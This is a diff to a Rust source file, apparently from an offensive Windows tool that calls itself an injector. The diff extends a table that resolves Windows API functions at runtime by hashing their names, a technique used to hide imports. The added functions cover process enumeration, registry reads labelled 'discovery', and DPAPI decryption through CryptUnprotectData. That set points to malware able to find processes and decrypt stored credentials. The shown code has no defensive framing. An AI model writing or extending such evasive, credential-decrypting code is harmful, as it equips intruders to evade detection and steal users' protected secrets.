@@ -20,16 +20,48 @@
 use std::ffi::c_void;
 use std::sync::OnceLock;
 
-use windows::Win32::Foundation::{HANDLE, WAIT_EVENT, WIN32_ERROR};
+use windows::Win32::Foundation::{HANDLE, HLOCAL, WAIT_EVENT, WIN32_ERROR};
+use windows::Win32::Security::Cryptography::CRYPT_INTEGER_BLOB;
 use windows::Win32::System::Memory::{PAGE_PROTECTION_FLAGS, VIRTUAL_ALLOCATION_TYPE};
+use windows::Win32::System::Registry::{HKEY, REG_SAM_FLAGS, REG_VALUE_TYPE};
 use windows::Win32::System::Threading::{
-    PROCESS_CREATION_FLAGS, PROCESS_INFORMATION, STARTUPINFOW,
+    PROCESS_ACCESS_RIGHTS, PROCESS_CREATION_FLAGS, PROCESS_INFORMATION, PROCESS_NAME_FORMAT,
+    STARTUPINFOW,
 };
 use windows::core::{BOOL, PCWSTR, PWSTR};
 
 use crate::resolve::{api, hash_bytes, hash_mod_bytes};
 
 type ThreadRoutine = unsafe extern "system" fn(*mut c_void) -> u32;
+
+/// Resolve one export in `module` (case-folded, like the module walk).
+///
+/// If the module isn't resident yet (e.g. crypt32), load it with
+/// `kernel32!LoadLibraryW` — itself resolved from the always-resident
+/// kernel32 — before walking the loader's module list again.
+fn resolve_in(module: &'static str, export: &'static str) -> Result<usize, &'static str> {
+    let m = hash_mod_bytes(module.as_bytes());
+    if crate::resolve::module_base(m).is_none() {
+        load_module(module)?;
+    }
+    api(m, hash_bytes(export.as_bytes())).ok_or(export)
+}
+
+/// Ensure `module` is mapped: `LoadLibraryW` if absent (kernel32 is always
+/// resident, so its export is resolvable without any other module resident).
+fn load_module(module: &'static str) -> Result<(), &'static str> {
+    let loader =
+        api(hash_mod_bytes(b"kernel32.dll"), hash_bytes(b"LoadLibraryW")).ok_or("LoadLibraryW")?;
+    let wide: Vec<u16> = module.encode_utf16().chain(std::iter::once(0)).collect();
+    // SAFETY: LoadLibraryW's address came from kernel32's export directory;
+    // the signature is the raw ABI and `wide` is NUL-terminated UTF-16.
+    unsafe {
+        std::mem::transmute::<usize, unsafe extern "system" fn(PCWSTR) -> HANDLE>(loader)(PCWSTR(
+            wide.as_ptr(),
+        ));
+    }
+    Ok(())
+}
 
 /// Exact raw-ABI kernel32 export set used by the injector.
 pub struct Kernel32 {
@@ -83,27 +115,34 @@ pub struct Kernel32 {
     pub wait_for_single_object: unsafe extern "system" fn(HANDLE, u32) -> WAIT_EVENT,
     /// `GetExitCodeProcess(h, &code) -> BOOL`
     pub get_exit_code_process: unsafe extern "system" fn(HANDLE, *mut u32) -> BOOL,
+    /// `ExpandEnvironmentStringsW(src, dst, cap) -> u32` (return = length / 0 on fail)
+    pub expand_environment_strings_w: unsafe extern "system" fn(PCWSTR, PWSTR, u32) -> u32,
+    /// `OpenProcess(access, inherit, pid) -> HANDLE` (NULL on fail)
+    pub open_process: unsafe extern "system" fn(PROCESS_ACCESS_RIGHTS, BOOL, u32) -> HANDLE,
+    /// `QueryFullProcessImageNameW(h, fmt, buf, &len) -> BOOL`
+    pub query_full_process_image_name_w:
+        unsafe extern "system" fn(HANDLE, PROCESS_NAME_FORMAT, PWSTR, *mut u32) -> BOOL,
+    /// `K32EnumProcesses(pids, bytes, &returned) -> BOOL`
+    pub k32_enum_processes: unsafe extern "system" fn(*mut u32, u32, *mut u32) -> BOOL,
+    /// `LocalFree(h) -> HLOCAL` (NULL on success)
+    pub local_free: unsafe extern "system" fn(HLOCAL) -> HLOCAL,
 }
 
 /// Resolved-at-first-use kernel32 table.
 pub static KERNEL32: OnceLock<Kernel32> = OnceLock::new();
 
 fn load() -> Result<Kernel32, &'static str> {
-    // All exports live in kernel32; a failed resolve reports the export name.
-    fn addr(name: &str) -> Option<usize> {
-        let m = hash_mod_bytes(b"kernel32.dll");
-        api(m, hash_bytes(name.as_bytes()))
-    }
+    const MODULE: &str = "kernel32.dll";
     macro_rules! resolve {
-        ($e:literal) => {{
-            match addr($e) {
-                Some(a) => a,
-                None => return Err($e),
+        ($e:literal) => {
+            match resolve_in(MODULE, $e) {
+                Ok(a) => a,
+                Err(name) => return Err(name),
             }
-        }};
+        };
     }
 
-    // SAFETY: each `addr` is the verified code address of a kernel32 export
+    // SAFETY: each `resolve!` is the verified code address of a kernel32 export
     // (kernel32 is loaded in every Windows process; the module hash is fixed
     // and case-folded, the export name hash is exact). transmute is the
     // sanctioned usize→fn-ptr bridge on x86-64; the signatures match the raw
@@ -188,6 +227,25 @@ fn load() -> Result<Kernel32, &'static str> {
                 usize,
                 unsafe extern "system" fn(HANDLE, *mut u32) -> BOOL,
             >(resolve!("GetExitCodeProcess")),
+            expand_environment_strings_w: std::mem::transmute::<
+                usize,
+                unsafe extern "system" fn(PCWSTR, PWSTR, u32) -> u32,
+            >(resolve!("ExpandEnvironmentStringsW")),
+            open_process: std::mem::transmute::<
+                usize,
+                unsafe extern "system" fn(PROCESS_ACCESS_RIGHTS, BOOL, u32) -> HANDLE,
+            >(resolve!("OpenProcess")),
+            query_full_process_image_name_w: std::mem::transmute::<
+                usize,
+                unsafe extern "system" fn(HANDLE, PROCESS_NAME_FORMAT, PWSTR, *mut u32) -> BOOL,
+            >(resolve!("QueryFullProcessImageNameW")),
+            k32_enum_processes: std::mem::transmute::<
+                usize,
+                unsafe extern "system" fn(*mut u32, u32, *mut u32) -> BOOL,
+            >(resolve!("K32EnumProcesses")),
+            local_free: std::mem::transmute::<usize, unsafe extern "system" fn(HLOCAL) -> HLOCAL>(
+                resolve!("LocalFree"),
+            ),
         })
     }
 }
@@ -202,6 +260,153 @@ pub fn kernel32() -> &'static Kernel32 {
     KERNEL32.get_or_init(|| match load() {
         Ok(t) => t,
         Err(name) => panic!("apitable: failed to resolve kernel32!{name}"),
+    })
+}
+
+/// advapi32 API table (Wave 4: discovery registry reads).
+pub struct Advapi32 {
+    /// `RegOpenKeyExW(root, sub, opts, access, &out) -> WIN32_ERROR`
+    pub reg_open_key_ex_w:
+        unsafe extern "system" fn(HKEY, PCWSTR, u32, REG_SAM_FLAGS, *mut HKEY) -> WIN32_ERROR,
+    /// `RegQueryValueExW(key, name, reserved, &type, data, &cb) -> WIN32_ERROR`
+    pub reg_query_value_ex_w: unsafe extern "system" fn(
+        HKEY,
+        PCWSTR,
+        *const u32,
+        *mut REG_VALUE_TYPE,
+        *mut u8,
+        *mut u32,
+    ) -> WIN32_ERROR,
+    /// `RegCloseKey(key) -> WIN32_ERROR`
+    pub reg_close_key: unsafe extern "system" fn(HKEY) -> WIN32_ERROR,
+}
+
+/// Resolved-at-first-use advapi32 table.
+pub static ADVAPI32: OnceLock<Advapi32> = OnceLock::new();
+
+fn load_advapi32() -> Result<Advapi32, &'static str> {
+    const MODULE: &str = "advapi32.dll";
+    macro_rules! resolve {
+        ($e:literal) => {
+            match resolve_in(MODULE, $e) {
+                Ok(a) => a,
+                Err(name) => return Err(name),
+            }
+        };
+    }
+    // SAFETY: as in [`load`] — verified advapi32 export addresses transmuted to
+    // fn pointers whose signatures match the raw `windows` 0.62 `link!` ABIs.
+    unsafe {
+        Ok(Advapi32 {
+            reg_open_key_ex_w: std::mem::transmute::<
+                usize,
+                unsafe extern "system" fn(
+                    HKEY,
+                    PCWSTR,
+                    u32,
+                    REG_SAM_FLAGS,
+                    *mut HKEY,
+                ) -> WIN32_ERROR,
+            >(resolve!("RegOpenKeyExW")),
+            reg_query_value_ex_w: std::mem::transmute::<
+                usize,
+                unsafe extern "system" fn(
+                    HKEY,
+                    PCWSTR,
+                    *const u32,
+                    *mut REG_VALUE_TYPE,
+                    *mut u8,
+                    *mut u32,
+                ) -> WIN32_ERROR,
+            >(resolve!("RegQueryValueExW")),
+            reg_close_key: std::mem::transmute::<
+                usize,
+                unsafe extern "system" fn(HKEY) -> WIN32_ERROR,
+            >(resolve!("RegCloseKey")),
+        })
+    }
+}
+
+pub fn advapi32() -> &'static Advapi32 {
+    ADVAPI32.get_or_init(|| match load_advapi32() {
+        Ok(t) => t,
+        Err(name) => panic!("apitable: failed to resolve advapi32!{name}"),
+    })
+}
+
+/// crypt32 API table (Wave 4: DPAPI).
+pub struct Crypt32 {
+    /// `CryptProtectData(&in, desc, entropy, reserved, prompt, flags, &out) -> BOOL`
+    pub crypt_protect_data: unsafe extern "system" fn(
+        *const CRYPT_INTEGER_BLOB,
+        PCWSTR,
+        *const CRYPT_INTEGER_BLOB,
+        *const c_void,
+        *const c_void,
+        u32,
+        *mut CRYPT_INTEGER_BLOB,
+    ) -> BOOL,
+    /// `CryptUnprotectData(&in, &desc, entropy, reserved, prompt, flags, &out) -> BOOL`
+    pub crypt_unprotect_data: unsafe extern "system" fn(
+        *const CRYPT_INTEGER_BLOB,
+        *mut PWSTR,
+        *const CRYPT_INTEGER_BLOB,
+        *const c_void,
+        *const c_void,
+        u32,
+        *mut CRYPT_INTEGER_BLOB,
+    ) -> BOOL,
+}
+
+/// Resolved-at-first-use crypt32 table.
+pub static CRYPT32: OnceLock<Crypt32> = OnceLock::new();
+
+fn load_crypt32() -> Result<Crypt32, &'static str> {
+    const MODULE: &str = "crypt32.dll";
+    macro_rules! resolve {
+        ($e:literal) => {
+            match resolve_in(MODULE, $e) {
+                Ok(a) => a,
+                Err(name) => return Err(name),
+            }
+        };
+    }
+    // SAFETY: as in [`load`] — verified crypt32 export addresses transmuted to
+    // fn pointers whose signatures match the raw `windows` 0.62 `link!` ABIs.
+    unsafe {
+        Ok(Crypt32 {
+            crypt_protect_data: std::mem::transmute::<
+                usize,
+                unsafe extern "system" fn(
+                    *const CRYPT_INTEGER_BLOB,
+                    PCWSTR,
+                    *const CRYPT_INTEGER_BLOB,
+                    *const c_void,
+                    *const c_void,
+                    u32,
+                    *mut CRYPT_INTEGER_BLOB,
+                ) -> BOOL,
+            >(resolve!("CryptProtectData")),
+            crypt_unprotect_data: std::mem::transmute::<
+                usize,
+                unsafe extern "system" fn(
+                    *const CRYPT_INTEGER_BLOB,
+                    *mut PWSTR,
+                    *const CRYPT_INTEGER_BLOB,
+                    *const c_void,
+                    *const c_void,
+                    u32,
+                    *mut CRYPT_INTEGER_BLOB,
+                ) -> BOOL,
+            >(resolve!("CryptUnprotectData")),
+        })
+    }
+}
+
+pub fn crypt32() -> &'static Crypt32 {
+    CRYPT32.get_or_init(|| match load_crypt32() {
+        Ok(t) => t,
+        Err(name) => panic!("apitable: failed to resolve crypt32!{name}"),
     })
 }
 
